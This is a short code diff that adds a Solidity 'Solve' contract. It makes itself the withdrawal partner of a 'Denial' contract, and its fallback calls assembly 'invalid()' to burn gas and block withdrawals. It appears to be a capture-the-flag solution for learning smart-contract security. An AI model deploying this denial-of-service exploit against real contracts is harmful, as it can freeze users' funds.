@@ -1,6 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+contract Solve {
+    constructor(Denial target) {
+        target.setWithdrawPartner(address(this));
+    }
+
+    fallback() external payable {
+        assembly {
+            invalid()
+        }
+    }
+}
+
 contract Denial {
 
     address public partner; // withdrawal partner - pay the gas, split the withdraw
